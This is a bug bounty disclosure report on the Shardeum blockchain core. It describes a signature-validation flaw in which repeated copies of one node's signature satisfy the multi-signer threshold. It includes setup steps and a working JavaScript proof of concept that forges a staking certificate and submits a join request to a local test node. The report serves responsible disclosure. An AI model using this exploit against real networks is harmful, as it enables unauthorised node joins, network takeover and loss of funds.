# 34252 - \[BC - Critical] Bypass Certificate Signing Validation

## Bypass Certificate Signing Validation

Submitted on Aug 7th 2024 at 21:12:49 UTC by @Blockian for [Boost | Shardeum: Core](https://immunefi.com/bounty/shardeum-core-boost/)

Report ID: #34252

Report type: Blockchain/DLT

Report severity: Critical

Target: <https://github.com/shardeum/shardus-core/tree/dev>

Impacts:

* Network not being able to confirm new transactions (total network shutdown)
* Direct loss of funds

### Description

## Bypass Certificate Signing Validation

### Impact

1. Bypass stake certificate validation, allowing for non-staking nodes and network take-over
2. Bypass nodes removal validation, allowing to remove nodes from the network

### Root Cause

The function `validateClosestActiveNodeSignatures` counts repeated signatures as different signatures, allowing for 1 valid signature to be counted as `minRequired`. In other words - signatures are counted, instead of signers.

### Deep Dive

The functions `validateClosestActiveNodeSignatures` and `validateActiveNodeSignatures` receive a parameter `minRequired` that specify what is the minimal number of nodes need to sign the appData to make it valid.

1. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1780>
2. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1746> It does so by looping over the signature list, and checking if the signature is valid. If it is, the counter is incremented.
3. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1763>
4. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1763> If the amount is more than the min required, `true` is returned
5. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1769>
6. <https://github.com/shardeum/shardus-core/blob/4d75f797a9d67af7a94dec8860220c4e0f9ade3c/src/shardus/index.ts#L1815>

### Suggested Fix

Remove the public key from `closestNodesByPubKey` after counting it.

### Flow

* Malicious node generates a fake `JoinRequest` with a fake `StakingCertificate`
  * It brute-forces `StakingCertificate` fields to make sure its one of the closest nodes to the hash of the staking certificates. This is easy, as only 1 node is needed to be close.
* It creates the full JoinRequest, with multiple copies of its signature, instead of signatures from many other nodes.
* It calls gossip-join-request
* Other nodes receive the join request, and validate it using `validateClosestActiveNodeSignatures`.
* The validation bypasses, as they count the number of signatures and not the number of signers.
* The new node joins the network without staking.

### Severity

This allows to take over the network (by kicking nodes / adding nodes) and so it critical.

### Proof of concept

### POC

#### Set-up

1. Clone `shardeum` (`dev` branch)
2. Clone `json-rpc-server` (`dev` branch)
3. Clone `simple-network-test` (`dev` branch)
4. Run `npm i` inside all three directories
5. Install `shardus` according to the readme in `shardeum`:

```bash
npm install -g shardus
npm update @shardus/archiver
```

6. Apply the `debug-10-nodes.patch` with a 5 nodes modification:

```diff
diff --git a/src/config/index.ts b/src/config/index.ts
index 245e749..7549557 100644
--- a/src/config/index.ts
+++ b/src/config/index.ts
@@ -132,8 +132,8 @@ config = merge(config, {
     p2p: {
       cycleDuration: 60,
       minNodesToAllowTxs: 1, // to allow single node networks
-      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 300, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
-      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 300,
+      baselineNodes: process.env.baselineNodes ? parseInt(process.env.baselineNodes) : 5, // config used for baseline for entering recovery, restore, and safety. Should be equivalient to minNodes on network startup
+      minNodes: process.env.minNodes ? parseInt(process.env.minNodes) : 5,
       maxNodes: process.env.maxNodes ? parseInt(process.env.maxNodes) : 1100,
       maxJoinedPerCycle: 10,
       maxSyncingPerCycle: 10,
@@ -146,7 +146,7 @@ config = merge(config, {
       amountToShrink: 5,
       maxDesiredMultiplier: 1.2,
       maxScaleReqs: 250, // todo: this will become a variable config but this should work for a 500 node demo
-      forceBogonFilteringOn: true,
+      forceBogonFilteringOn: false,
       //these are new feature in 1.3.0, we can make them default:true in shardus-core later
 
       // 1.2.3 migration starts
@@ -306,11 +306,11 @@ config = merge(
   config,
   {
     server: {
-      mode: 'release', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
+      mode: 'debug', // todo: must set this to "release" for public networks or get security on endpoints. use "debug"
       // for easier debugging
       debug: {
-        startInFatalsLogMode: true, // true setting good for big aws test with nodes joining under stress.
-        startInErrorLogMode: false,
+        startInFatalsLogMode: false, // true setting good for big aws test with nodes joining under stress.
+        startInErrorLogMode: true,
         robustQueryDebug: false,
         fakeNetworkDelay: 0,
         disableSnapshots: true, // do not check in if set to false

```

7. Apply the suggested local network changes from the docs:

```bash
// Local Testing Adjustments
// src/config/index.ts
cycleDuration: 30,

// Generate new block every 3s
// src/shardeum/shardeumFlags.ts
blockProductionRate: 3,
```

8. Prepare the `shardeum` project by running

```bash
npm run prepare
```

inside the `shardeum` directory.

9. Start a local network by running

```bash
shardus start 5
```

inside the `shardeum` directory.

10. Run a local `json-rpc-server` by running

```bash
npm run start
```

at the `json-rpc-server` directory.

11. Wait for the network to be ready, by looking at the output from the `json-rpc-server`. We need `Current number of good nodes` to be 5.
12. Apply the patch for package.json inside `simple-network-test`

```diff
diff --git a/package.json b/package.json
index f1fa89a..5b096a9 100644
--- a/package.json
+++ b/package.json
@@ -3,6 +3,9 @@
     "commander": "^12.1.0",
     "dotenv": "^16.4.5",
     "ethers": "^5.7.2",
-    "winston": "^3.13.0"
+    "winston": "^3.13.0",
+    "@ethereumjs/util": "^9.0.2",
+    "@shardus/types": "1.2.14",
+    "@shardus/crypto-utils": "4.1.3"
   }
 }

```

13. Create the poc file

```js
const { Utils } = require("@shardus/types");
const crypto = require("@shardus/crypto-utils");

// Function to fetch and extract the 'start' field from the newest cycle data
const fetchStartField = async () => {
  try {
    const response = await fetch("http://localhost:9001/sync-newest-cycle", {
      method: "GET",
      headers: {
        "Content-Type": "application/json",
      },
    });

    if (!response.ok) {
      throw new Error(`Error: ${response.status} ${response.statusText}`);
    }

    const data = await response.json();
    const startField = data.newestCycle.start;
    return startField;
  } catch (error) {
    console.error("Error fetching start field:", error.message);
  }
};

const newKeyPair = {
  publicKey: "4b4d0378d88087d47074006fff1067f24d2b46f0b031dc0eac3c6aae89200f06",
  secretKey:
    "94a5acef210ee6d3fbadde8da6cd1246abf6259542265981edd0b1c63a3b2bc14b4d0378d88087d47074006fff1067f24d2b46f0b031dc0eac3c6aae89200f06",
};

const nodeKeyPair = {
  publicKey: "a943f173ebdce6a598e8397c11abc28484e55373546ee068069a5740ffb1de96",
  secretKey:
    "42331631724c9e6b9cdf2df5b88e78171c9a79ec4273ddd4bda3dad360d6a62ca943f173ebdce6a598e8397c11abc28484e55373546ee068069a5740ffb1de96",
};

const hashKey =
  "69fa4195670576c0160d660c3be36556ff8d504725be8a59b5a96509e0c994bc";
crypto.init(hashKey);
crypto.setCustomStringifier(Utils.safeStringify, "shardus_safeStringify");

const sign = (obj, keypair) => {
  // const objCopy = Utils.safeJsonParse(Utils.safeStringify(obj));
  const objCopy = structuredClone(obj);
  // console.log(objCopy)
  crypto.signObj(objCopy, keypair.secretKey, keypair.publicKey);
  return objCopy;
};

const signMalicious = (obj, keypair) => {
  // const objCopy = Utils.safeJsonParse(Utils.safeStringify(obj));
  const objCopy = structuredClone(obj);
  delete objCopy.signs;
  delete objCopy.sign;
  // console.log(objCopy)
  crypto.signObj(objCopy, keypair.secretKey, keypair.publicKey);
  return objCopy;
};

const verify = (obj, expectedPk) => {
  try {
    if (expectedPk) {
      if (obj.sign.owner !== expectedPk) return false;
    }
    return crypto.verifyObj(obj);
  } catch (e) {
    this.mainLogger.error(
      `Error in verifying object ${Utils.safeStringify(obj)}`,
      e
    );
    return false;
  }
};

const createJoinRequestPayload = async (joinRequestTimestamp) => {
  // Create the join request payload
  let joinRequestPayload = {
    nodeInfo: {
      externalIp: "127.0.0.1",
      externalPort: 9003,
      internalIp: "0.0.0.0",
      internalPort: 10003,
      activeTimestamp: 55,
      address: "testtest",
      joinRequestTimestamp: joinRequestTimestamp,
      publicKey: newKeyPair.publicKey,
    },
    selectionNum: "testtest",
    cycleMarker: "55",
    proofOfWork: "testtest",
    version: "1.11.3",
    appJoinData: {
      version: "1.11.3",
      stakeCert: {
        nominee: newKeyPair.publicKey,
        stake: { dataType: "bi", value: "8ac7230489e80000" },
        signs: [],
      },
    },
  };
  const stakeCertSign = signMalicious(
    joinRequestPayload.appJoinData.stakeCert,
    nodeKeyPair
  ).sign;
  joinRequestPayload.appJoinData.stakeCert.signs.push(stakeCertSign);
  joinRequestPayload.appJoinData.stakeCert.signs.push(stakeCertSign);
  joinRequestPayload.appJoinData.stakeCert.signs.push(stakeCertSign);
  joinRequestPayload.appJoinData.stakeCert.signs.push(stakeCertSign);
  joinRequestPayload.appJoinData.stakeCert.signs.push(stakeCertSign);
  joinRequestPayload = await sign(joinRequestPayload, newKeyPair);
  return joinRequestPayload;
};

// Function to submit the join request
const submitJoinRequest = async () => {
  try {
    const joinRequestPayload = await createJoinRequestPayload(
      (await fetchStartField()) + 29
    );
    const response = await fetch("http://127.0.0.1:9001/join", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(joinRequestPayload),
    });

    if (!response.ok) {
      // Read the response body
      const errorData = await response.json();
      throw new Error(
        `Error: ${response.status} ${response.statusText} - ${JSON.stringify(
          errorData
        )}`
      );
    }

    const responseData = await response.json();
    console.log("Join request successful:", responseData);
  } catch (error) {
    console.error("Error submitting join request:", error.message);
  }
};

// Call the function to submit the join request
submitJoinRequest();

```

14. Update `nodeKeyPair` in the POC to contain the private and public keys of one of the nodes in the network
15. Run the POC by calling

```bash
node poc.js
```

Inside `simple-network-test`.

16. If the join fails because the cycle is post Q1, wait a few seconds and repeat, in a loop, until submitting in the first quarter of the next cycle.
17. All nodes should have `validateJoinRequest success!!!` In their outpus

#### POC Limitations

* As you can see, signatures can be re-used.
* It is still required that the malicious node would be one of the 7 closest nodes of the staking certificate hash. This is easily done by brute-force, as only one malicious node need to be in the 7 closest from the network, which is very easily done with the 130K nodes currently on the network.
